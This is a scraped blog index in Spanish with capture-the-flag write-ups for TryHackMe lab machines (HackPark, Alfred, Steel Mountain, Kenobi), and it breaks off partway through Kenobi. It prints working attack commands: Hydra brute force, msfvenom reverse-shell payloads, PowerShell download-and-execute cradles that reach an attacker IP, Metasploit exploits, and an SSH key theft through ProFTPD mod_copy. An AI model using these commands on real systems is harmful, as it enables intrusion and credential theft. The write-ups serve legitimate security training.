[TryHackMe]"},{"date":"2023-08-30","image":"/images/post_pics/hackpark/hackpark.png","link":"https://k3ssdev.github.io/posts/hackpark/","summary":"Introducción Subimos un puntito el nivel de dificultad con “HackPark”, la siguiente máquina las series “Offensive Pentesting” de TryHackMe. En esta sala se practican cosas como la fuerza bruta con Hydra contra una app web, el uso de exploits con Metasploit y la elevación de privilegios en Windows.","tags":["Hydra","Medium","Meterpreter","Nishang","Powershell","Privilege Escalation","Reverse Shell","TryHackMe","Windows","WinPEAS"],"text":"introducción subimos un puntito el nivel de dificultad con “hackpark”, la siguiente máquina las series “offensive pentesting” de tryhackme. en esta sala se practican cosas como la fuerza bruta con hydra contra una app web, el uso de exploits con metasploit y la elevación de privilegios en windows.\ntask 1 - desplegar la máquina paso 1: pongo la máquina en marcha y accedo a la aplicación web que tiene. la primera pregunta es sobre la imagen que sale en la web, un famoso payaso de una película de miedo. task 2 - using hydra to brute-force a login paso 2: compruebo que hay formulario de login en la web. asumo que hay usuario “admin”. uso burp suite para obtener post del formulario. uso la información recogida en burp para construir un ataque de fuerza bruta con hydra. el login es admin / 1qaz2wsx # uso de hydra, el modulo http-post-form lleva 3 arugmentos [ url : request_body : mensaje_error] hydra -l admin -p /usr/share/wordlists/rockyou.txt 10.10.208.69 http-post-form \u0026#39;/account/login.aspx?returnurl=/admin:__viewstate=y6wrzsjzimymo53lfsrnxlb7%2b7fzabeyox49iqu3r14gnh%2ff8xhuzykujbrpjbk7rg8cxgjxjiod6jkbg86g17c0plg%2fqifxvi3j%2br5m4vum2igkcdzmw1rnlagtyccydujro7e4xqx2e458%2frv94ohbikbc7hshyfwhwpgk4heowjre\u0026amp;__eventvalidation=zibxajyntd%2bk8wtwtcectcm8t7r2qkzit%2b%2bo9vzfwt5gsvorujeinzflga4xe6yjp3whe5lkod%2bhlevcq0sbnlzmz1uvz1orx3iox66bzaxqhxqpjsxqnuabluebtgxh%2b8fytxrcmpaflar3uzloqtc%2fclru2nolntc2i%2fmjabyhqqhr\u0026amp;ctl00%24maincontent%24loginuser%24username=^user^\u0026amp;ctl00%24maincontent%24loginuser%24password=^pass^\u0026amp;ctl00%24maincontent%24loginuser%24loginbutton=iniciar+sesi%c3%b3n:login failed\u0026#39; -vv [verbose] resolving addresses ... [verbose] resolving done [verbose] page redirected to http[s]://10.10.208.69:80/admin [80][http-post-form] host: 10.10.208.69 login: admin password: 1qaz2wsx [status] attack finished for 10.10.208.69 (waiting for children to complete tests) task 3 - compromise the machine paso 3: webapp es blogengine versión 3.3.6.0 encuentro exploit cve-2019-6714 blogengine.net 3.3.6 - directory traversal / remote code execution paso 4: descargo exploit, cambio ip y puerto. renombro fichero a postview.ascx subo fichero al server en http://10.10.10.10/admin/app/editor/editpost.cshtml activo exploit al abrir http://10.10.10.10/?theme=../../app_data/files # shell inversa con éxito rlwrap nc -lvnp 4444 listening on [any] 4444 ... connect to [10.14.50.184] from (unknown) [10.10.208.69] 49268 microsoft windows [version 6.3.9600] (c) 2013 microsoft corporation. all rights reserved. whoami c:\\windows\\system32\\inetsrv\u0026gt;whoami iis apppool\\blog task 4 - windows privilege escalation paso 5: creo un payload con msfvenom para obtener sesión con meterpreter. utilizo el script x86/shikata_ga_nai # comando de msfvenom para crear el payload msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai lhost=10.14.50.184 lport=1234 -f exe -o shell-name.exe [-] no platform was selected, choosing msf::module::platform::windows from the payload found 1 compatible encoders attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 381 (iteration=0) x86/shikata_ga_nai chosen with final size 381 payload size: 381 bytes final size of exe file: 73802 bytes saved as: shell-name.exe paso 6: preparo metasploit con exploit/multi/handler inicio servidor web con python para descargarlo en el objetivo. # mestasploit msf6 \u0026gt; use exploit/multi/handler [*] using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set lhost tun0 msf6 exploit(multi/handler) \u0026gt; set lport 1234 msf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; run [*] started reverse tcp handler on ... # servidor web con python python3 -m http.server 80 serving http on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... # netcat, comando en shell remota powershell -c \u0026#34;invoke-webrequest -uri \u0026#39;http://10.14.50.184/shell-name.exe\u0026#39; -outfile \u0026#39;c:\\windows\\temp\\shell.exe\u0026#39;\u0026#34; # el comnado run se ejecuta antes que .\\shell.exe msf6 exploit(multi/handler) \u0026gt; run # ejecuto shell en maquina remota .\\shell.exe [*] started reverse tcp handler on 10.14.50.184:1234 [*] sending stage (175686 bytes) to 10.10.208.69 [*] meterpreter session 7 opened (10.14.50.184:1234 -\u0026gt; 10.10.208.69:49314) at 2023-08-29 22:04:06 +0200 meterpreter # recopilo informacion del sistema meterpreter \u0026gt; sysinfo computer : hackpark os : windows 2012 r2 (6.3 build 9600). architecture : x64 system language : en_us domain : workgroup logged on users : 1 meterpreter : x86/windows # informacion de usuario sesión meterpreter \u0026gt; getuid server username: nt authority\\system encuentro servicio wscheduler corriendo en el sistema, reviso sus logs. meterpreter \u0026gt; ls listing: c:\\program files (x86)\\systemscheduler\\events ====================================================== mode size type last modified name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 1959 fil 2023-08-29 22:18:34 +0200 20198415519.ini 100666/rw-rw-rw- 30551 fil 2023-08-29 22:18:34 +0200 20198415519.ini_log.txt 100666/rw-rw-rw- 290 fil 2020-10-02 23:50:12 +0200 2020102145012.ini 100666/rw-rw-rw- 186 fil 2023-08-29 22:16:31 +0200 administrator.flg 100666/rw-rw-rw- 182 fil 2023-08-29 22:16:28 +0200 system_svc.flg 100666/rw-rw-rw- 0 fil 2023-08-29 20:44:12 +0200 scheduler.flg 100666/rw-rw-rw- 449 fil 2023-08-29 22:16:31 +0200 sessioninfo.flg 100666/rw-rw-rw- 0 fil 2023-08-29 22:17:39 +0200 service.flg meterpreter \u0026gt; cat 20198415519.ini_log.txt 08/04/19 15:06:01,event started ok, (administrator) 08/04/19 15:06:30,process ended. pid:2608,exitcode:1,message.exe (administrator) migro el proceso al de message.exe o ejecuto en meterpreter “getsystem” # flag de usuario jeff meterpreter \u0026gt; ls listing: c:\\users\\jeff\\desktop ============================== mode size type last modified name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 282 fil 2019-08-04 20:54:53 +0200 desktop.ini 100666/rw-rw-rw- 32 fil 2019-08-04 20:57:10 +0200 user.txt meterpreter \u0026gt; cat user.txt 759bd8af507517bcfaede78a21a73e39 # flag de root meterpreter \u0026gt; ls listing: c:\\users\\administrator\\desktop ======================================= mode size type last modified name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 1029 fil 2019-08-04 13:36:42 +0200 system scheduler.lnk 100666/rw-rw-rw- 282 fil 2019-08-03 19:43:54 +0200 desktop.ini 100666/rw-rw-rw- 32 fil 2019-08-04 20:51:42 +0200 root.txt meterpreter \u0026gt; cat root.txt 7e13d97f05f7ceb9881a3eb3d78d3e72 task 4 - privilege escalation without metasploit se puede conseguir acceso privilegiado sin metasploit. se crea paylod con msfvenom de windows/shell_reverse_tcp # genero el payload nuevo msfvenom -p windows/shell_reverse_tcp -a x86 --encoder x86/shikata_ga_nai lhost=10.14.50.184 lport=1234 -f exe -o shell_tcp.exe #preparo servidor python y lo descargo en la maquina remota # el listener recibe la conexion rlwrap nc -lvnp 1234 listening on [any] 1234 ... ls connect to [10.14.50.184] from (unknown) [10.10.208.69] 49397 dir microsoft windows [version 6.3.9600] (c) 2013 microsoft corporation. all rights reserved. c:\\windows\\temp\u0026gt; ejecucion de winpeas y busqueda de fecha de instalación original: # subo winpeas.bat y lo ejecuto. es un proceso largo y algo aburrido, asi que obtengo la fecha con systeminfo c:\\windows\\system32\\inetsrv\u0026gt;systeminfo | findstr /i date original install date: 8/3/2019, 10:43:23 am conclusion aunque se supone que ésta máquina es mas compleja que las anteriores, me he sentido cómodo usando burp suite, hydra, msfvenom y metasploit. la mayor parte de los problemas en esta sala me los he encontrado con las shells inversas, que no acaban de ser muy estables por lo que sea, excepto con meterpreter que si que ha ido bien. tampoco me ha parecido muy fluido el uso de winpeas, aunque es una herramienta interesante.\n(◕‿‿◕) hack the planet! ","title":"HackPark [TryHackMe]"},{"date":"2023-08-29","image":"/images/post_pics/alfred/alfred.png","link":"https://k3ssdev.github.io/posts/alfred/","summary":"Introducción La segunda sala del bloque “Advanced Exploitation” en el path “Offensive Pentesting”. En esta sala se aprende a explotar una configuración incorrecta en Jenkins, un servidor de automatización. Se utilizará Nishang en una aplicación Windows para obtener acceso inicial y escalada de privilegios.","tags":["Easy","Jenkins","Meterpreter","Privilege Escalation","tokens","TryHackMe","Windows"],"text":"introducción la segunda sala del bloque “advanced exploitation” en el path “offensive pentesting”. en esta sala se aprende a explotar una configuración incorrecta en jenkins, un servidor de automatización. se utilizará nishang en una aplicación windows para obtener acceso inicial y escalada de privilegios. en thm viene etiquetada como una sala fácil, pero powershell me sigue costando, lo que la vuelve un poco más complicada para mi.\ntask 1 - desplegar la máquina paso 1: escaneo la máquina desplegada para descubrir los servicios. encuentro 3 puertos abiertos. se encuentra página de login en el puerto 8080, usa jenkins. pruebo user/pass por defecto admin:admin y logro acceso. versión jenkins ver. 2.190.1 encuentro posible método rce - jenkins 2.150.2 - remote command execution (metasploit) obtengo acceso con meterpreter. pruebo el acceso tambien de forma manual con el script de powershell. # escaneo inicial con salida a fichero sudo nmap -ss --min-rate 5000 -p- -pn -v -on nmap_inicial 10.10.123.255 # listo y filtro los puertos en nmap_inicial ports=$(cat nmap_inicial | grep \u0026#39;^[0-9]\u0026#39; | cut -d \u0026#39;/\u0026#39; -f1 | xargs | tr \u0026#39; \u0026#39; \u0026#39;,\u0026#39;) # escaneo final con los puertos guardados nmap -p$ports -sc -sv -pn -on nmap_final 10.10.123.255 resultado nmap: nmap scan report for 10.10.123.255 host is up (0.049s latency). not shown: 65532 filtered tcp ports (no-response) port state service 80/tcp open http 3389/tcp open ms-wbt-server 8080/tcp open http-proxy brute-force login con metasploit: # busco jenkins en metasploit msf6 \u0026gt; search jenkins matching modules ================ # name disclosure date rank check description - ---- --------------- ---- ----- ----------- 0 exploit/windows/misc/ibm_websphere_java_deserialize 2015-11-06 excellent no ibm websphere rce java deserialization vulnerability 1 exploit/multi/http/jenkins_metaprogramming 2019-01-08 excellent yes jenkins acl bypass and metaprogramming rce 2 exploit/linux/http/jenkins_cli_deserialization 2017-04-26 excellent yes jenkins cli deserialization 3 exploit/linux/misc/jenkins_ldap_deserialize 2016-11-16 excellent yes jenkins cli http java deserialization vulnerability 4 exploit/linux/misc/jenkins_java_deserialize 2015-11-18 excellent yes jenkins cli rmi java deserialization vulnerability 5 post/multi/gather/jenkins_gather normal no jenkins credential collector 6 auxiliary/gather/jenkins_cred_recovery normal yes jenkins domain credential recovery 7 auxiliary/scanner/jenkins/jenkins_udp_broadcast_enum normal no jenkins server broadcast enumeration 8 exploit/multi/http/jenkins_xstream_deserialize 2016-02-24 excellent yes jenkins xstream groovy classpath deserialization vulnerability 9 auxiliary/scanner/http/jenkins_enum normal no jenkins-ci enumeration 10 auxiliary/scanner/http/jenkins_login normal no jenkins-ci login utility 11 exploit/multi/http/jenkins_script_console 2013-01-18 good yes jenkins-ci script-console java execution 12 auxiliary/scanner/http/jenkins_command normal no jenkins-ci unauthenticated script-console scanner 13 exploit/linux/misc/opennms_java_serialize 2015-11-06 normal no opennms java object unserialization remote code execution msf6 \u0026gt; use 10 msf6 auxiliary(scanner/http/jenkins_login) \u0026gt; set rhosts 10.10.123.255 rhosts =\u0026gt; 10.10.123.255 # elijo el modulo de login y reviso opciones module options (auxiliary/scanner/http/jenkins_login): name current setting required description ---- --------------- -------- ----------- blank_passwords true no try blank passwords for all users bruteforce_speed 5 yes how fast to bruteforce, from 0 to 5 db_all_creds true no try each user/password couple stored in the current database db_all_pass false no add all passwords in the current database to the list db_all_users false no add all users in the current database to the list db_skip_existing none no skip existing credentials stored in the current database (accepted: none, user, user\u0026amp;realm) http_method post yes the http method to use for the login (accepted: get, post) password no a specific password to authenticate with pass_file no file containing passwords, one per line proxies no a proxy chain of format type:host:port[,type:host:port][...] rhosts 10.10.123.255 yes the target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html rport 8080 yes the target port (tcp) ssl false no negotiate ssl/tls for outgoing connections stop_on_success false yes stop guessing when a credential works for a host targeturi no the path to the jenkins-ci application threads 1 yes the number of concurrent threads (max one per host) username no a specific username to authenticate as userpass_file no file containing users and passwords separated by space, one pair per line user_as_pass false no try the username as the password for all users user_file no file containing usernames, one per line verbose true yes whether to print output for all attempts vhost no http server virtual host # selecciono wordlist de user/pass comunes msf6 auxiliary(scanner/http/jenkins_login) \u0026gt; set userpass_file /usr/share/wordlists/metasploit/default_userpass_for_services_unhash.txt userpass_file =\u0026gt; /usr/share/wordlists/metasploit/default_userpass_for_services_unhash.txt msf6 auxiliary(scanner/http/jenkins_login) \u0026gt; run # encuentro login [+] 10.10.123.255:8080 - login successful: admin:admin rce con metasploit: # configuro lhost y rhosts msf6 exploit(multi/http/jenkins_script_console) \u0026gt; set lhost tun0 msf6 exploit(multi/http/jenkins_script_console) \u0026gt; set rhosts 10.10.199.157 rhosts =\u0026gt; 10.10.199.157 msf6 exploit(multi/http/jenkins_script_console) \u0026gt; set rport 8080 rport =\u0026gt; 8080 # indico user/pass msf6 exploit(multi/http/jenkins_script_console) \u0026gt; set username admin username =\u0026gt; admin msf6 exploit(multi/http/jenkins_script_console) \u0026gt; set password admin password =\u0026gt; admin # ejecuto el exploit msf6 exploit(multi/http/jenkins_script_console) \u0026gt; run [*] started reverse tcp handler on 10.14.50.184:4444 [*] checking access to the script console [*] logging in... [*] using csrf token: \u0026#39;f977d727b64f7f6bcda0835d0bd4730dc4b348c303de26e296cc95358eab60e1\u0026#39; (jenkins-crumb style v1) [*] 10.10.199.157:8080 - sending command stager... [*] command stager progress - 2.06% done (2048/99626 bytes) [*] command stager progress - 4.11% done (4096/99626 bytes) [*] command stager progress - 6.17% done (6144/99626 bytes) ... [*] sending stage (175686 bytes) to 10.10.199.157 [*] meterpreter session 1 opened (10.14.50.184:4444 -\u0026gt; 10.10.199.157:49212) at 2023-08-28 18:01:49 +0200 meterpreter \u0026gt; ls listing: c:\\program files (x86)\\jenkins ======================================= mode size type last modified name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 0 fil 2023-08-28 17:41:44 +0200 .laststarted ... reverse shell manual: # creo servidor con python donde tengo el script de powershell python3 -m http.server 80 # creo un listener con netcat nc -lvnp 1234 # ejecuto comando en consola-web a traves de un proyecto nuevo y se crea la conexion powershell iex (new-object net.webclient).downloadstring(\u0026#39;http://your-ip:your-port/invoke-powershelltcp.ps1\u0026#39;);invoke-powershelltcp -reverse -ipaddress your-ip -port your-port task 2 - switching shells paso 2: se crea un payload con msfvenom. el payload contiene el mismo código que el script anterior shikata_ga_nai. el shell será un reverse_tcp de meterpreter. es lo mismo que lo realizado en el paso 1 usando directamente el exploit en metasploit. # genero payload con msfvenom msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai lhost=10.14.50.184 lport=1234 -f exe -o shell-name.exe [-] no platform was selected, choosing msf::module::platform::windows from the payload found 1 compatible encoders attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 381 (iteration=0) x86/shikata_ga_nai chosen with final size 381 payload size: 381 bytes final size of exe file: 73802 bytes saved as: shell-name.exe task 3 - privilege escalation paso 3: se usará la suplantación de token para conseguir acceso privilegiado (info sobre tokens https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens). abusing token privileges for lpe https://www.exploit-db.com/papers/42556 cargo módulo de powershell en meterpreter y ejecuto whoami /priv para ver privilegios. uso impersonate_token para conseguir el token de acceso. migro el proceso de meterpreter a services.exe para conseguir un token de privilegio más elevado. revisión de tokens en meterpreter: meterpreter \u0026gt; load powershell loading extension powershell...success. meterpreter \u0026gt; powershell_shell ps \u0026gt; whoami /priv privileges information ---------------------- privilege name description state =============================== ========================================= ======= seincreasequotaprivilege adjust memory quotas for a process enabled sesecurityprivilege manage auditing and security log enabled setakeownershipprivilege take ownership of files or other objects enabled seloaddriverprivilege load and unload device drivers enabled sesystemprofileprivilege profile system performance enabled sesystemtimeprivilege change the system time enabled seprofilesingleprocessprivilege profile single process enabled seincreasebasepriorityprivilege increase scheduling priority enabled secreatepagefileprivilege create a pagefile enabled sebackupprivilege back up files and directories enabled serestoreprivilege restore files and directories enabled seshutdownprivilege shut down the system enabled sedebugprivilege debug programs enabled sesystemenvironmentprivilege modify firmware environment values enabled sechangenotifyprivilege bypass traverse checking enabled seremoteshutdownprivilege force shutdown from a remote system enabled seundockprivilege remove computer from docking station enabled semanagevolumeprivilege perform volume maintenance tasks enabled seimpersonateprivilege impersonate a client after authentication enabled secreateglobalprivilege create global objects enabled seincreaseworkingsetprivilege increase a process working set enabled setimezoneprivilege change the time zone enabled secreatesymboliclinkprivilege create symbolic links enabled impersonate_token en meterpreter: meterpreter \u0026gt; load incognito loading extension incognito...success. meterpreter \u0026gt; list_tokens -g [-] warning: not currently running as system, not all tokens will be available call rev2self if primary process token is system delegation tokens available ======================================== \\ builtin\\administrators builtin\\users nt authority\\authenticated users nt authority\\ntlm authentication nt authority\\service nt authority\\this organization nt service\\audioendpointbuilder nt service\\certpropsvc nt service\\cscservice nt service\\iphlpsvc nt service\\lanmanserver nt service\\pcasvc nt service\\schedule nt service\\sens nt service\\sessionenv nt service\\trkwks nt service\\umrdpservice nt service\\uxsms nt service\\winmgmt nt service\\wuauserv impersonation tokens available ======================================== no tokens available meterpreter \u0026gt; impersonate_token \u0026#34;builtin\\administrators\u0026#34; [-] warning: not currently running as system, not all tokens will be available call rev2self if primary process token is system [+] delegation token available [+] successfully impersonated user nt authority\\system meterpreter \u0026gt; getuid server username: nt authority\\system migración del servicio: meterpreter \u0026gt; ps process list ============ pid ppid name arch session user path --- ---- ---- ---- ------- ---- ---- 0 0 [system process] 4 0 system x64 0 396 4 smss.exe x64 0 nt authority\\system c:\\windows\\system32\\smss.exe 528 520 csrss.exe x64 0 nt authority\\system c:\\windows\\system32\\csrss.exe 576 520 wininit.exe x64 0 nt authority\\system c:\\windows\\system32\\wininit.exe 584 568 csrss.exe x64 1 nt authority\\system c:\\windows\\system32\\csrss.exe 612 568 winlogon.exe x64 1 nt authority\\system c:\\windows\\system32\\winlogon.exe 672 576 services.exe x64 0 nt authority\\system c:\\windows\\system32\\services.exe ... meterpreter \u0026gt; migrate 672 [*] migrating from 2492 to 672... [*] migration completed successfully.| bandera root: meterpreter \u0026gt; search -f root.txt found 1 result... ================= path size (bytes) modified (utc) ---- ------------ -------------- c:\\windows\\system32\\config\\root.txt 70 2019-10-26 13:36:00 +0200 meterpreter \u0026gt; cat c:\\windows\\system32\\config\\root.txt meterpreter \u0026gt; cd c:\\\\windows\\\\system32\\\\config meterpreter \u0026gt; cat root.txt dff0f748678f280250f25a45b8046b4a conclusion aunque estamos ya en el bloque de “advanced exploitation”, esta máquina me ha parecido bastante sencilla. en la anterior, “steel mountain”, tuve más dificultades con algunas tareas. los pasos no los he seguido al pie de la letra y he ido probando según veía lo que me parecía mejor, pero el resultado es el mismo que con los pasos propuestos. igualmente he probado con las instrucciones propuestas, para poder probar distintos métodos de acceso y poder tener una visión más amplia de las diferentes formas de abordar una máquina como esta.\n(◕‿‿◕) hack the planet! ","title":"Alfred [TryHackMe]"},{"date":"2023-08-28","image":"/images/post_pics/steelmountain/steel_mountain.jpeg","link":"https://k3ssdev.github.io/posts/steel-mountain/","summary":"Introducción Steel Mountain es la cuarta máquina de la serie \u0026ldquo;Offensive Pentesting\u0026rdquo; de TryHackMe. Es una sala fácil que tiene como objetivo aprender sobre escalada de privilegios en un entorno Windows comprometido. En esta máquina, se explora la explotación de una vulnerabilidad conocida en un servidor web, se obtiene acceso inicial, se explora la enumeración y finalmente se logra escalar privilegios para obtener control total sobre la máquina.","tags":["“Meterpreter”","“Windows\"","Easy","Enumeration","HTTP Server","Metasploit","Privilege Escalation","Reverse Shell","TryHackMe","WinPeas"],"text":"introducción steel mountain es la cuarta máquina de la serie \u0026ldquo;offensive pentesting\u0026rdquo; de tryhackme. es una sala fácil que tiene como objetivo aprender sobre escalada de privilegios en un entorno windows comprometido. en esta máquina, se explora la explotación de una vulnerabilidad conocida en un servidor web, se obtiene acceso inicial, se explora la enumeración y finalmente se logra escalar privilegios para obtener control total sobre la máquina.\ntask 1 - desplegar la máquina paso 1: desplegar la máquina accedo a la plataforma tryhackme y despliego la máquina steel mountain. task 2 - acceso inicial paso 1: escaneo de puertos con nmap realizo un escaneo de puertos en la máquina objetivo utilizando nmap.\ncomandos utilizados:\nsudo nmap -ss --min-rate 5000 -p- 10.10.25.83 -pn -v -on nmap_inicial paso 2: identificar el servidor web en el puerto 8080 escaneo el servidor web en el puerto 8080 para obtener más información.\ncomandos utilizados:\nnmap -p8080 -sc -sv 10.10.25.83 -pn -on nmap_final paso 3: identificar la cve para el servidor httpfileserver busco sobre el servidor rejetto en exploit-db y encuentro la cve-2014-6287 asociada al servidor httpfileserver 2.3. paso 4: explotación del servidor httpfileserver utilizo metasploit para explotar la vulnerabilidad en el servidor rejetto httpfileserver.\ncomandos utilizados:\nmsf6 \u0026gt; use exploit/windows/http/rejetto_hfs_exec msf6 exploit(windows/http/rejetto_hfs_exec) \u0026gt; set rhosts 10.10.25.83 msf6 exploit(windows/http/rejetto_hfs_exec) \u0026gt; set rport 8080 msf6 exploit(windows/http/rejetto_hfs_exec) \u0026gt; set lhost tun0 msf6 exploit(windows/http/rejetto_hfs_exec) \u0026gt; run task 3 - privilege escalation paso 1: enumerar la máquina comprometida después de obtener acceso, realizo una enumeración inicial de la máquina comprometida. paso 2: escalar privilegios como usuario bill utilizo el script powerup.ps1 para buscar vulnerabilidades de escalada de privilegios.\ncomandos utilizados:\n. .\\\\powerup.ps1 invoke-allchecks paso 3: identificar el servicio vulnerable examino la salida de powerup y encuentro información sobre el servicio vulnerable \u0026ldquo;advancedsystemcareservice9\u0026rdquo;. paso 4: generar y ejecutar un payload malicioso genero un payload con msfvenom y lo ejecuto en la máquina comprometida.\ncomandos utilizados:\nsudo msfvenom -p windows/shell_reverse_tcp lhost=tu_ip lport=4455 -f exe -o advanced.exe paso 5: resultado con éxito, obtengo privilegios y gano acceso de administrador en la máquina comprometida. task 4 - access and escalation without metasploit paso 4.1: descargar el exploit y ncat.exe descargo el exploit y nc.exe en mi máquina local. paso 4.2: iniciar un servidor http en mi máquina local inicio un servidor http en mi máquina local con python para servir los archivos necesarios a la máquina objetivo.\ncomandos utilizados:\npython3 -m http.server 80 paso 4.3: preparar un listener de netcat preparo un listener de netcat en mi máquina local para recibir la conexión inversa desde la máquina objetivo.\ncomandos utilizados:\nnc -lvnp 1234 paso 4.4: ejecutar el exploit dos veces en la máquina objetivo ejecuto el exploit dos veces contra la máquina objetivo para descargar ncat.exe y luego ejecuto el payload.\ncomandos utilizados:\nsudo python2 exploit.py 10.10.192.191 8080 paso 4.5: obtener una conexión inversa una vez que tengo una conexión inversa en mi listener, tengo acceso a la máquina objetivo como el usuario \u0026ldquo;bill\u0026rdquo; y ya puedo escalar privilegios como se hizo anteriormente. conclusion \u0026ldquo;steel mountain\u0026rdquo; ha sido una máquina bastante divertida con tématica de mr. robot, una gran serie sobre hacking que es especialmente realista en los detalles técnicos. en esta máquina, tenemos la oportunidad de aprender más sobre la explotación de una vulnerabilidad conocida en un servidor web en un entorno windows, obtener acceso mediante una shell inversa y escalar privilegios para obtener control total sobre la máquina con metasploit y meterpreter, además de poder hacer lo mismo con un exploit personalizado sin utilizar metasploit.\n(◕‿‿◕) hack the planet! ","title":"Steel Mountain [TryHackMe]"},{"date":"2023-08-28","image":"/images/post_pics/kenobi/kenobi.png","link":"https://k3ssdev.github.io/posts/kenobi/","summary":"Introducción La sala ¨Kenobi” está pensada como introducción de la serie “Offensive Pentesting”. Es la tercera máquina, y tiene una dificultad baja. El objetivo es vulnerar una máquina Linux para obtener acceso a un recurso compartido de Samba, manipular una versión vulnerable de proftpd para obtener acceso inicial y escalar privilegios a root a través de un binario SUID.","tags":["Easy","FTP","Linux","Privilege Escalation","SAMBA","SUID","TryHackMe"],"text":"introducción la sala ¨kenobi” está pensada como introducción de la serie “offensive pentesting”. es la tercera máquina, y tiene una dificultad baja. el objetivo es vulnerar una máquina linux para obtener acceso a un recurso compartido de samba, manipular una versión vulnerable de proftpd para obtener acceso inicial y escalar privilegios a root a través de un binario suid.\ntask 1 - desplegar la máquina paso 1: escaneo la máquina desplegada para descubrir los servicios. encuentro 7 puertos abiertos. el objetivo tiene servicios ftp, ssh, http y samba como posibles vectores de ataque. # escaneo inicial con salida a fichero sudo nmap -ss --min-rate 5000 -p- -pn -v -on nmap_inicial 10.10.107.4 # listo y filtro los puertos en nmap_inicial ports=$(cat nmap_inicial | grep \u0026#39;^[0-9]\u0026#39; | cut -d \u0026#39;/\u0026#39; -f1 | xargs | tr \u0026#39; \u0026#39; \u0026#39;,\u0026#39;) # escaneo final con los puertos guardados nmap -p$ports -sc -sv -pn -on nmap_final 10.10.107.4 salida de shell para analizar: # resultado de escaneo ╰─ cat nmap_final | grep tcp ─╯ 21/tcp open ftp proftpd 1.3.5 22/tcp open ssh openssh 7.2p2 ubuntu 4ubuntu2.7 (ubuntu linux; protocol 2.0) 80/tcp open http apache httpd 2.4.18 ((ubuntu)) 111/tcp open rpcbind 2-4 (rpc #100000) | 100000 2,3,4 111/tcp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 58369/tcp6 mountd | 100005 1,2,3 59881/tcp mountd | 100021 1,3,4 40297/tcp6 nlockmgr | 100021 1,3,4 44483/tcp nlockmgr | 100227 2,3 2049/tcp nfs_acl | 100227 2,3 2049/tcp6 nfs_acl 139/tcp open netbios-ssn samba smbd 3.x - 4.x (workgroup: workgroup) 445/tcp open samba smbd 4.3.11-ubuntu (workgroup: workgroup) 2049/tcp open nfs 2-4 (rpc #100003) 44483/tcp open nlockmgr 1-4 (rpc #100021) 49693/tcp open mountd 1-3 (rpc #100005) 50169/tcp open mountd 1-3 (rpc #100005) 59881/tcp open mountd 1-3 (rpc #100005) task 2 - enumerando samba uso de nuevo nmap con un script específico para enumerar servicios smb. se encuentran 3 recursos compartidos, siendo “anonymous” uno de ellos, siendo una posible vía de acceso inicial. se accede con smbclient y la cuenta anonymous, encontrando un fichero log con informacion sobre claves ssh y configuración de ftp. escaneo puerto 111 para rpcbind con scripts de network file sharing usando nmap. se encuentra un punto de montaje en “/var”. paso 1: enumero smb con nmap nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.107.4 resultado para analizar port state service 445/tcp open microsoft-ds host script results: | smb-enum-shares: | account_used: guest | \\\\10.10.107.4\\ipc$: | type: stype_ipc_hidden | comment: ipc service (kenobi server (samba, ubuntu)) | users: 2 | max users: \u0026lt;unlimited\u0026gt; | path: c:\\tmp | anonymous access: read/write | current user access: read/write | \\\\10.10.107.4\\anonymous: | type: stype_disktree | comment: | users: 0 | max users: \u0026lt;unlimited\u0026gt; | path: c:\\home\\kenobi\\share | anonymous access: read/write | current user access: read/write | \\\\10.10.107.4\\print$: | type: stype_disktree | comment: printer drivers | users: 0 | max users: \u0026lt;unlimited\u0026gt; | path: c:\\var\\lib\\samba\\printers | anonymous access: \u0026lt;none\u0026gt; |_ current user access: \u0026lt;none\u0026gt; nmap done: 1 ip address (1 host up) scanned in 6.49 seconds paso 2: accedo con smbclient # accedo con smbclient smbclient //10.10.107.4/anonymous # reviso contenido smb: \\\u0026gt; ls . d 0 wed sep 4 12:49:09 2019 .. d 0 wed sep 4 12:56:07 2019 log.txt n 12237 wed sep 4 12:49:09 2019 # descargo fichero smb: \\\u0026gt; get log.txt paso 3: escaneo de puerto rpc # escaneo con nmap del puerto 111 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.107.4 # resultado starting nmap 7.94 ( https://nmap.org ) at 2023-08-27 22:32 cest nmap scan report for 10.10.107.4 host is up (0.042s latency). port state service 111/tcp open rpcbind | nfs-showmount: |_ /var * task 3 - acceso inicial con proftpd la versión del servicio es 1.3.5\nen exploit-db se encuentra 4 exploits para esa versión.\nse usa el exploit de **proftpd module mod_copy.\nel módulo mod_copy implementa los comandos site cpfr y site cpto, que se pueden usar para copiar archivos/directorios de un lugar a otro en el servidor. cualquier cliente no autenticado puede aprovechar estos comandos para copiar archivos desde cualquier parte del sistema de archivos a un destino elegido.\nme conecto con netcat y descargo la clave privada de kenobi.\nmonto el directorio compartido /var/tmp en mi equipo y descargo la clave privada ssh.\npaso 4: conexión con netcat # conexion al puerto 21 con netcat nc 10.10.107.4 21 ─╯ 220 proftpd 1.3.5 server (proftpd default installation) [10.10.107.4] # en nc, ejecuto el primer comando para copiar el fichero site cpfr /home/kenobi/.ssh/id_rsa 350 file or directory exists, ready for destination name # ejecuto el segundo comando que lo pega en la unidad montada en /var site cpto /var/tmp/id_rsa 250 copy successful paso 5: acceso al directorio remoto # creo una carpeta en mi equipo mkdir /mnt/kenobinfs # monto el directorio compartido en mi equipo mount 10.10.107.4:/var /mnt/kenobinfs # listo el directorio para comprobarlo ls -la /mnt/kenobinfs total 56 drwxr-xr-x 14 root root 4096 sep 4 2019 . drwxr-xr-x 3 root root 4096 ago 27 22:44 .. drwxr-xr-x 2 root root 4096 sep 4 2019 backups drwxr-xr-x 